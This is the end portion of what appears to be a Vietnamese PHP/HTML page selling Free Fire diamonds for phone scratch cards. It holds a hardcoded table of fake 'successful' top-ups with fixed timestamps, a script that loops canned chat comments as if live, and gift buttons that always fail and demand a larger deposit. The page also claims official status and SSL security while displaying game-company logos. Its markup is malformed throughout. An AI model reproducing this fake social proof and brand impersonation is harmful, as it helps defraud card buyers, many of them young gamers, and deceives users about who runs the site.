                                              text: "Vui Lòng Nạp Ít Nhất 50k Để Nhận gói code",
                                                                icon: "error",
                                                                                    button: "Nạp Thẻ Ngay!",
                                                                                                        });
                                                                                                            }
                                                                                                                </script>
                                                                                                                    </center> 
                                                                                                                        </center> 
<script>
    function nhanqua(){
        swal({
  title: "Nhận Quà Thất Bại",
  text: "Vui Lòng Nạp Ít Nhất 100k Tại <?php echo $bs_nameweb; ?>  Để Nhận Gói Quà Siêu Phẩm Này, Trân Trọng!!!",
  icon: "error",
  button: "Nạp Thẻ Ngay!",
});
        
    }
    </script>
                                                                                                               </div>
</div>
<div>
</form>
<div class="form-group">
<p style="font-style: italic;font-size: 13px;">★ Bạn sẽ được mở nhận quà sau khi nạp thẻ thành công.</p>
</div>
</p>
<hr>
<div class="col-md-12">
<article class="xbang-gia-quy-doi">
<h4 class="text-center text-uppercase text-success p-0 m-0 mb-3">BẢNG GIÁ NẠP THẺ</h4>
</div>
</form>
</p>
<hr>
<div id="result" style="text-align: center;"></div>
<div class="form-groupooi">

</tr></td>
</div>
<table class="table table-bordered table-hover">
<thead class="thead-light" style="text-align:center;">
<tr>
<th style="text-align:center;">Mệnh giá<br></th>
<th style="text-align:center;">Nhận Được <br></th>
</tr>
<td><b>50.000 </b> VND</td>
<td><b>3.200 <img src="@BS_vatpham/point.png"  width="22px" alt="" class="kimcuong"> <b style= "color: #0000EE"> <img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></b></td>
</tr></td>
</tr>
<tr>
<td><b>100,000 </b> VND</td>
<td><b>9.100 <img src="@BS_vatpham/point.png"  width="22px" alt="" class="kimcuong"> <b style= "color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></td>
</tr></td>
</tr>
<tr>
<td><b>200.000 </b> VND</td>
<td><b>15.250 <img src="@BS_vatpham/point.png"  width="22px" alt="" class="kimcuong"> <b style= "color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></td>
</tr></td>
</tr>
<tr>
<td><b>500.000 </b> VND</td>
<td><b>50.100 <img src="@BS_vatpham/point.png"  width="22px" alt="" class="kimcuong"> <b style= "color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></td>
</tr></td>
</tr>
  </tbody>
  </table>
</tr
   
     </td>
    </tr>
  </tbody>
  </table>
</script>

                    <div class="lichsunapthe">
                    <h3><center><b style ="color: black">LỊCH SỬ NẠP THẺ CÀO</b></center></h3>

                <table class="table pc_only table-bordered blueTable" id="table_auto">
                    <thead>                   
                    <tr style="background: -webkit-gradient(linear, 0% 0%, 100% 0%, from(#bd0000), to(#100146));border:solid 1px #a20187;color:#fff;">
                        <th>ID Game</th>
                        <th>Trạng Thái</th>
                        <th>Thời Gian</th>
         
                    </tr>
                    </thead>
	                    <tbody>
                                    
                                    <tr>
                                        <td style="color:black">******3121</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  15.250   Kim Cương<b style ="color: #0000EE"> + Gói  Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">Khoảng Vài Giây trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******9751</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">Khoảng Vài Giây trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****3127</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói  Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">Khoảng Vài Giây trước</td>
                                       </tr>
                                                   <tr>
                                        <td style="color:black">******1645</td> 
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">Khoảng Vài Giây trước</td>
                                    </tr>
		                                    <tr>
		                                         <td style="color:black">******6132</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">1 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****6218</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói  Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">1 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******6123</td>
                                        <td style="color:black"><font color="red">Nạp Thất Thất Bại Vì Thẻ Lỗi Hoặc Đã Được Sử Dụng</font></td>
                                        <td style="color:black">2 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****79751</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF"> </font></td>
                                        <td style="color:black">3 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******76129</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF"> </font></td>
                                        <td style="color:black">3 phút trước</td>
                                    </tr>
                                                    <tr>
                                        <td style="color:black">******7942</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">3 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****6421</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói  Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">4 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******6813</td>
                                        <td style="color:black"><font color="red">Nạp Thất Thất Bại Vì Thẻ Lỗi Hoặc Đã Được Sử Dụng</font></td>
                                        <td style="color:black">6 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****7760</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF"> </font></td>
                                        <td style="color:black">8 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******7509</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF"> </font></td>
                                        <td style="color:black">10 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******4738</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  15.250  Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">11 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******1485</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">16 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******8734</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">55 phút trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******0172</td>
                                        <td style="color:black"><font color="red">Nạp Thất Bại Vì Thẻ Lỗi Hoặc Đã Được Sử Dụng</font></td>
                                        <td style="color:black">1 giờ  trước</td>
                                    </tr>
                                    <td style="color:black">******9931</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">   </font></td>
                                        <td style="color:black">2 giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******3107</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">2 giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****0453</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói  Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">3 giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******6813</td>
                                        <td style="color:black"><font color="red">Nạp Thất Thất Bại Vì Thẻ Lỗi Hoặc Đã Được Sử Dụng</font></td>
                                        <td style="color:black">4 Giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****7760</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">5 Giờ Trước trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******7509</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF"> </font></td>
                                        <td style="color:black">6 Giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******4738</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  15.250  Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">6 Giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******1485</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">7 Giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******8734</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">8 giờ trước trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******0172</td>
                                        <td style="color:black"><font color="red">Nạp Thất Bại Vì Thẻ Lỗi Hoặc Đã Được Sử Dụng</font></td>
                                        <td style="color:black">10 giờ  trước</td>
                                    </tr>
                                           </tr>                                 <td 
                                        <td stylee="color:black">******9385</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">10 giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******2534</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">10 giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******0922</td>
                                        <td style="color:black"><font color="red">Nạp Thất Bại Vì Thẻ Lỗi Hoặc Đã Được Sử Dụng</font></td>
                                        <td style="color:black">10 giờ  trước</td>
                                    </tr>
                                    <td style="color:black">******9331</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">10 giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******9307</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">11 giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****0402</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói  Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">11 giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******0213</td>
                                        <td style="color:black"><font color="red">Nạp Thất Thất Bại Vì Thẻ Lỗi Hoặc Đã Được Sử Dụng</font></td>
                                        <td style="color:black">11 Giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">*****7793</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">12 Giờ Trước trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******9309</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF">  </font></td>
                                        <td style="color:black">12 Giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******4938</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  15.250  Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">12 Giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******2485</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  3.050 Kim Cương<b style ="color: #FF00EF"> </font></td>
                                        <td style="color:black">12 Giờ trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******9234</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  9.150 Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">12 giờ trước trước</td>
                                    </tr>
		                                    <tr>
                                        <td style="color:black">******3197</td>
                                        <td style="color:black"><font color="green">Nạp Thành Công  15.250 Kim Cương<b style ="color: #0000EE"> + Gói Quà FF<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /></b></font></td>
                                        <td style="color:black">12 giờ  trước</td>
                                    </tr>
			                    </tbody>
                    </table>                  

<center>
</div>
</div>
</div>
<script src="https://unpkg.com/@popperjs/core@2"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.1/js/bootstrap.js"></script>
</tr>
			                    </tbody>
                    </table>
                    
	
 </div>
<div class="col-sm-12 text-center">
<h2 class="guide text-center text-info" style="font-size:18px" id="dkmid">Hướng dẫn check ID tài khoản:</h2>
<img src="https://i.imgur.com/aZnkoLf.jpg" alt="Check ID tài khoản" style="width:330px;margin-bottom:20px" />
</div>
<div class="col-md-12">
<article class="noti-info">
<li><img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></b><b><?php echo $bs_nameweb; ?></b> là cổng nạp khuyến mãi nhận quà chính thức, uy tín, tự động. Hỗ trợ thanh toán bằng thẻ cào Viettel/Mobi/Vina.</br></li>
<li><b>Lưu ý:</b> Chương trình khuyến mãi nhận quà Free Fire tại <?php echo $bs_nameweb; ?> Sẽ Diễn Ra Tới Hết Ngày 30/12/2021 </li>
<li>Sau khi nạp thành công, Kim Cương Và Quà Tặng Free Fire sẽ được gửi trực tiếp vào ID tài khoản mà bạn đã điền nhanh chóng.<b>Kim cương</b> từ shop hoàn toàn là kim cương sạch 100%, Được tính vào MEMBERSHIP GARENA FREEFIRE   </li>
<li>Mọi thông tin tài khoản hoàn toàn được <b>bảo mật</b> theo tiêu chuẩn SSL.Khách hàng hoàn toàn yên tâm khi nạp thẻ tại đây!</li>
</article>
                 </div>
                 &nbsp
                 &nbsp	
                 </div></div>					
<br>                                      
</style>
</body>
  </tbody>
  </table>
</div>
<center>
<h3><b>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
                  </div>
                  <div class="col-lg-12">
                    <div style="text-align:center" class="history-buy-js">


                                        </div>
                  </div>
                </div>



  </style>


        </script>








                    </div>





	<Br/><Br/>

&nbsp
    </div>
  </div>  
  
  </div>
<footer class="footer">
      <div class="container">
        <span class="text-muted">
            <div class="col-12 col-md-8 foot-logo">
          <div class="row">
            <div class="col-2"><img alt="VNG-logo" src="bisex/VNG-logo.png" class="img-fluid"></div>
            <div class="col-5"><img alt="lightspeed" src="bisex/foot_logo3.png" class="img-fluid"></div>
            <div class="col-2"><img alt="pubg" src="bisex/foot_logo1.png" class="img-fluid"></div>
            <div class="col-3"><img alt="tencentgames" src="bisex/foot_logo2.png" class="img-fluid">
            </div>
          </div>
        </div>
       

        </span>
      </div>
    </footer>
<script src="https://unpkg.com/@popperjs/core@2"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.1/js/bootstrap.js"></script>
<style>

  .inbox_chat {
    height: 550px;
    overflow-y: scroll;
}
.chat_list {
    border-bottom: 1px solid #c4c4c4;
    margin: 0;
    padding: 18px 16px 10px;
}
.chat_people {
    overflow: hidden;
    clear: both;
}
.chat_img {
    float: left;
    width: 11%;
}
.chat_ib {
    float: left;
    padding: 0 0 0 15px;
    width: 95%;
}
.chat_ib h5 {
    font-size: 15px;
    color: #464646;
    margin: 0 0 8px 0;
}
.chat_ib p {
    font-size: 14px;
    color: #989898;
    margin: auto;
}
.chat_ib h5 span {
    font-size: 13px;
    float: right;
}
.c-layout-go2top {
    display: inline-block;
    position: fixed;
    bottom: 130px;
    right: 29px;
    cursor: pointer;
    z-index: 200;
}

.c-layout-go2top>svg {
    opacity: 1;
    filter: alpha(opacity=50);
    color: red;
    font-size: 38px;
    font-weight: 300;
}

.mesgs {
    width: 100% !important;
}
.mesgs {
    float: left;
    padding: 30px 15px 0 25px;
    width: 60%;
}
.type_msg {
    border-top: 1px solid #c4c4c4;
    position: relative;
}
.input_msg_write input {
    background: rgba(0, 0, 0, 0) none repeat scroll 0 0;
    border: medium none;
    color: #4c4c4c;
    font-size: 15px;
    min-height: 48px;
    width: 100%;
    padding: 8px;
}
input[type="text"] {
    color: #333333 !important;
}
.msg_send_btn {
    background: #05728f none repeat scroll 0 0;
    border: medium none;
    border-radius: 50%;
    color: #fff;
    cursor: pointer;
    font-size: 30px;
    line-height: 1;
    height: 33px;
    position: absolute;
    right: 0;
    top: 11px;
    width: 33px;
}
  .messaging {
    color: #000 !important
  }
  .flex-around {
    justify-content: space-around;
  }


.badge {
    padding: 0.45em 0.4em;
    font-weight: 500;
}
    .badge-pill {
    padding-right: 1.2em;
    padding-left: 1.2em;
    border-radius: 10rem;
    font-size: 13px;
}
.badge-primary {
    color: #fff;
    background-color: #ffa000;
}
</style>

<script type="text/javascript">
  var loop = 0;var interval; var loop2 = 0;
  $(function() {
    load(function(res) {
      json = JSON.parse(res);
      interval = setInterval(function() {
        if (json.length - 1 <= loop) {
          loop = 0;
        }
        addComment(json[loop].name, json[loop].mess);
        loop += 1;
      }, 2000);
      json.forEach(function(v, i) {
        if (loop2 <= 5) {
          loop2 += 1;
        }else{
          loop2 = 1;
        }
        if (i > 8) { return; }
      });
    });

    $('.msg_send_btn').click(function() {
      text = $('.write_msg');
      if (!!!text.val()) return;
      addComment("Bạn", text.val());
      text.val('');
    });
  });

  function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
  }

  function load(callback) {
    $.ajax({
      url: 'json_binhluan.php',
      type: 'GET'
      }).done(function(res) {
        callback(res);
      });
  }
  function addComment(name, mess) {
    var mess = `<div class="chat_list">
      <div class="chat_people"><div class="chat_img"></div><div class="chat_ib"><h5>` + name + `<span class="chat_date">Vừa Gửi</span></h5><p> ` + mess + `</p></div>
      </div>
    </div>
    `;
    $('.wrapper-chat-list').append(mess);
    var elem = document.querySelector('.inbox_chat');
    elem.scrollTop = elem.scrollHeight;
  }
</script>


<script>
    jQuery(function() {
  jQuery('#showall').click(function() {
    jQuery('.targetDiv').show();
  });
  jQuery('.showSingle').click(function() {
    jQuery('.targetDiv').hide();
    jQuery('#div' + $(this).attr('target')).show();
    $("#nhanthongbao").hide();
    $("#nhanthongbao1").hide();
  });
});
    if ( window.history.replaceState ) {
  window.history.replaceState( null, null, window.location.href );
}
</script>
						</body>
</html>